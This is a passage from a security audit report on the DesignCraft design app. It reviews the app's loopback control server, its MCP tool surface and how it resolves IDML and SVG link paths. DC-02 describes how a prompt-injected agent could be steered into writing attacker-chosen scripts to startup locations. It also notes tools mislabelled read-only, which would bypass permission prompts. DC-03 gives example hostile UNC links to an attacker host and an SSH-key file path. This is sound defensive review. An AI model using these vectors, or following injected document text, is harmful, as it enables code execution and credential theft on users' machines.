- The app contains no outbound network client. Sockets: an opt-in loopback listener (`--control PORT` / `DESIGNCRAFT_CONTROL_PORT`) and an MCP-side `TcpStream` client to a user-supplied address. No reqwest/ureq/hyper/rustls/openssl in `Cargo.lock`; `tokio` is only a `pin-project-lite` dependency of `wasm-bindgen-futures`. Links open the default browser on user click only. - Control server is more hardened than CadCraft's: loopback bind, connections capped at 16, 4 MiB line limit, and any first line that is not a JSON object with a string `method` (an HTTP request line from a browser fetch, a WebSocket handshake, junk) gets one error and the connection is closed, so a web page cannot smuggle a command in a request body (`control_server.rs:4-8,58-157`, with unit tests). It still has no token, so any local process or user can drive it (DC-01).
- Main residual risks are by design but larger than CadCraft's: through MCP `execute` or the control port an agent can write attacker-chosen text content to any path with any extension (`file.exportText`, `file.exportHtml`), which is a code-execution primitive via a Startup folder or shell rc file, and can read arbitrary text/CSV/XML files (DC-02). Two MCP tools carry `readOnlyHint: true` but accept a `path` they write to.
- Opening an IDML (or placing one, or rendering an SVG) resolves document-supplied link paths with no containment: absolute and UNC paths are read verbatim (DC-03). No HTTP fetch happens, but on Windows a `\\host\share\x.png` path in a hostile document would trigger an SMB connection and could leak NTLM credentials, and the bytes of any local file named by the link are embedded into the document.
- All 535 registry packages in `Cargo.lock` have checksums and the crates.io source; no `[patch]`, `git =`, `registry =`, proc-macro crates or out-of-tree paths. Obscure crates (`glifo`, `polycool`, `zcheapstr`, `fearless_simd`, `pxfm`, `dify`, `roots`, `open`) were traced to vello/kurbo/zvariant/hayro/moxcms/egui_kittest (the last is a dev-dependency only).
- CI/CD is hygienic (`permissions: contents: read`, secrets confined to the `release` environment, no `pull_request_target`), with the same minor unpinned-download notes as CadCraft (DC-05). No scanner finding needed escalation; the scan's 4 MEDIUM items are expected patterns or false positives (see Known-good patterns).

## Findings

**DC-01** · **MEDIUM** · Unauthenticated automation channel · `apps/designcraft/src/control_server.rs:28,58-157`, `docs/control-protocol.md:8-14`
Evidence: `TcpListener::bind(("127.0.0.1", port))`; "A line that is not a JSON object with a string `method` (an HTTP request line from a browser's cross-origin `fetch`, a stray `nc`, binary junk) gets one error reply and the connection is closed"; docs: "The port has no authentication, so only enable it while you use it."
- Loopback only and opt-in (`--control PORT`, or env `DESIGNCRAFT_CONTROL_PORT`, which could be set persistently). No token. No Host/Origin check, but it is not HTTP: a browser `fetch`/WebSocket/DNS-rebinding attempt starts with `POST|GET / HTTP/1.1`, which is rejected and the socket closed before any later line runs (unit tests `http_request_closes_before_the_body_runs`, `tcp_connection_is_closed_after_junk`). This is a clear improvement over CadCraft (CAD-01), where the web-page vector was open. Static reasoning only, not tested. An attacker who can make the browser send a request whose very first line is valid JSON is not known to exist: HTTP request lines are fixed.
- Any local process, or any other local user on a shared Windows machine (RDP/terminal server), can connect and run any engine command. Reachable methods (`crates/ui-egui/src/control.rs:106-343`): `engine.execute` (every engine command), `app.open/save/export`, `ui.render/screenshot {path}`, `ui.key/text/click/drag/pointer`, `ui.dialog.*`, `app.quit`. 16 concurrent connections, 60 s per-request timeout, 4 MiB lines.
Recommendation: enable `--control` only while an agent session is active, use a non-default port, and do not set `DESIGNCRAFT_CONTROL_PORT` globally. Upstream hardening: per-launch token printed to stderr and required in the first line.

**DC-02** · **MEDIUM** · MCP/control capabilities: arbitrary-path write of attacker-chosen content, arbitrary text read; metadata mislabels file-writing tools · `crates/engine/src/cmd/export.rs:54-98`, `crates/engine/src/cmd/file.rs:158-165,244-257`, `crates/engine/src/cmd/xml.rs:380-390`, `crates/engine/src/cmd/datamerge/mod.rs:736-747`, `crates/mcp/src/tools.rs:219-250`
Evidence: `file.exportText` -> `std::fs::write(path, text.as_bytes())` where `text` is the story's plain text (`export_text`, `export.rs:86-95`; the extension only selects RTF vs txt, any path accepted); `export_html` -> `std::fs::write(path, text.as_bytes())` (`export.rs:54-66`); `file.printBooklet`, PDF/IDML/EPUB exports, `swatch.save`, library/book saves write to caller-supplied paths with no allow-list or confirmation. Reads: `file.open`/`app.open` (any `.designcraft`/`.idml`), `file.place {path}` (any image, or any `.txt/.md/.rtf/.docx/.xlsx` flowed into a frame, then readable with `get_story`), `xml.import {path}` (`read_to_string`), `data.source.select {path}` (CSV/TSV/TXT/XLSX, rows readable via `data.fields`/`data.preview`). MCP tools: `open_document`, `save_document`, `place_image`, `export_png`, `render_page {path}`, `screenshot {path}`, plus `execute`/`batch` reaching everything above.
- The worrying part is the combination `set_story_text` (agent-controlled text) + `file.exportText {path, format:"txt"}`: it writes arbitrary content to an arbitrary path, for example a `.cmd`/`.ps1`/`.bat` in the Windows Startup folder or a shell rc file, which is code execution on next login. CadCraft's equivalent writes were limited to CAD-formatted content. A prompt-injected agent (for instance via text inside a hostile IDML/DOCX/CSV that flows back through `get_story`/`inspect_document`) could be steered into this. No tool spawns processes or touches the network, and nothing here is malicious intent: it is the by-design "everything is a command" surface.
- Tool metadata inaccuracy relevant to agent permission prompts: `render_page` (`tools.rs:219-234`) and `screenshot` (`tools.rs:245-251`) are declared `readOnlyHint: true`, yet both write a PNG to `path` when given one. A client that auto-approves read-only-hinted tools would let an agent overwrite arbitrary files with PNG bytes without a prompt.
- No hidden instructions or poisoning in tool names, descriptions or schemas (see MCP section).
Recommendation: keep per-call approval for `execute`, `batch`, `save_document`, `open_document`, `place_image`, `export_png`, `render_page`, `screenshot`; do not auto-approve the whole `mcp__designcraft__*` namespace and do not trust the read-only hints; open only trusted documents with an agent attached. Upstream: restrict export extensions and refuse writes outside the document folder or user documents unless confirmed; fix the two hints.

**DC-03** · **MEDIUM** · Documents name local/UNC paths that the app opens on load (no network fetch, but possible SMB/NTLM leak and local-file embedding) · `crates/engine/src/cmd/interchange.rs:36-99`, `crates/idml/src/import.rs:24-38,2101-2135,2428-2449`, `crates/engine/src/cmd/datamerge/mod.rs:620-646`, `crates/engine/src/cmd/links.rs:92-112`, `crates/images/src/lib.rs:56-76`
Evidence: `read_packaged_link`: `let mut candidates = vec![std::path::PathBuf::from(link)];` then `std::fs::read(&path)` for each candidate; IDML `LinkResourceURI` is turned into a path by `uri_to_path` (strips `file:`/`file://`, percent-decodes) and, when the `<Contents>` element is empty, `(self.read_link)(p)` is called; the bytes become the asset's `data` even if they are not an image (mime falls back to `image/png`, `import.rs:2119-2135`). The library entry point `import_idml` uses `default_reader` = bare `std::fs::read(path)` (`import.rs:28-31`; only tests call it, the engine uses `import_idml_with`).
- Does opening a document fetch anything? No HTTP/FTP/web-font/remote-image fetching exists anywhere (`http(s)://` image cells in Data Merge are explicitly skipped, `parse.rs:288`; hyperlinks are only annotations). What does happen automatically on open: (1) IDML: every graphic with a `Link` and no embedded `Contents` triggers a read of the named path, absolute and relative-to-cwd first, with no restriction to image types, sizes or folders (the sanitising `..`-rejecting candidates at `interchange.rs:70-88` are added only after the raw path); (2) native `.designcraft`: `resolve_sources_on_open` runs `Path::is_file()`/`metadata` on each Data Merge source path stored in the file; the Links panel/preflight run `metadata`+`read` on asset link paths; (3) SVG rendering: usvg's default resolver loads local `<image href>` targets (from knowledge of usvg, not verified, source unavailable offline).
- Impact (static reasoning, not tested): a hostile document containing `\\attacker\share\x.png` (or `file:////attacker/share/x`) makes Windows open an SMB connection, which can leak the user's NTLM hash on networks that allow outbound SMB. A link to a sensitive local file (for example `file:///C:/Users/me/.ssh/id_ed25519`) is read at open and embedded into the document as asset data; it would leave the machine only if the user then saves/exports/shares the document (native save, IDML `<Contents>` base64 at `idml/src/export.rs:1694-1698`, or `Package`). The embedded bytes are not displayed. In MCP use, an agent opening a hostile IDML triggers the same reads.
Recommendation: open only IDML/native/SVG files you trust; on Windows consider blocking outbound SMB (TCP 445) at the firewall. Upstream: restrict link reads to image types, size caps, and the package folder (and ask before touching absolute/UNC paths); skip UNC paths in `resolve_sources_on_open`/`status()`; set a restrictive `usvg` `image_href_resolver`.

**DC-05** · **LOW** · CI/CD supply chain (maintainer pipeline only; none of it runs on a user's machine) · `.github/workflows/release.yml:83,86,142,145,210,211,312,350,353`, `freebsd.yml:49`, `packaging/windows/sign.ps1:77`, `packaging/linux/package.sh:109`

Recommendation: none for local builds.

**DC-06** · **LOW** · Persisted preferences can queue browser URLs · `crates/ui-egui/src/lib.rs:197-198,784-785`, `apps/designcraft/src/main.rs:58-75`
Evidence: `pub pending_urls: Vec<String>,` is a serialised `UiState` field (no `#[serde(skip)]`, unlike its neighbours); at startup `ui.json` is deserialised into `app.ui` and every `pending_urls` entry is passed to `ctx.open_url(egui::OpenUrl::new_tab(url))`. Only someone who can already write `%APPDATA%\DesignCraft\ui.json` can use it (documents do not carry `UiState`), and the app itself only ever queues static getartcraft/discord/github URLs, so this is defence in depth. Recommendation: upstream add `#[serde(skip)]`.

**DC-07** · **LOW / INFO** · Optional external build input · `crates/fonts/build.rs:9-55`, `.github/workflows/release.yml:76-82`
Evidence: with `CRAFT_FONTS_DIR=<checkout>` the build reads `fonts/manifest.txt` and emits `include_bytes!("<canonicalised path>")` for each line (`dir.join(file).canonicalize()`, no containment check, so a manifest line such as `../../x` would embed that file into the binary). CI releases always check out `storytold/craft-fonts` at the pinned commit `abb83316d96aa59c1cf64784289e378fe9fa5695`; that repository was not reviewed. No network access in the script. Recommendation: do not set `CRAFT_FONTS_DIR` unless you trust that checkout; the app builds and runs without it.

## Build-time execution review
